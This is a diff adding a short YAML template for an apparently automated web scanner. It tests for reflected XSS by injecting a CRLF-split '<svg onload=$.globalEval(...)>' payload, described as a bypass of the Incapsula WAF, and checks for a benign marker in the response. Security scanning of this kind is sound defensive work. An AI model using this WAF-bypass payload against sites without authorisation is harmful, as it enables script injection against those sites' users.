@@ -1,0 +1,21 @@
+id: patt-xss-inca-01-name
+name: 'PATT xss patt-xss-inca-01 via name'
+severity: high
+type: active
+tags:
+  - xss
+  - patt
+  - wafincapsula
+description: 'PATT Incapsula 11 May 2019: CRLF + jQuery globalEval. [patt:patt-xss-inca-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/3%20-%20XSS%20Common%20WAF%20Bypass.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      name:
+        - '<svg onload
+=$.globalEval("nxp0030");>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nxp0030'
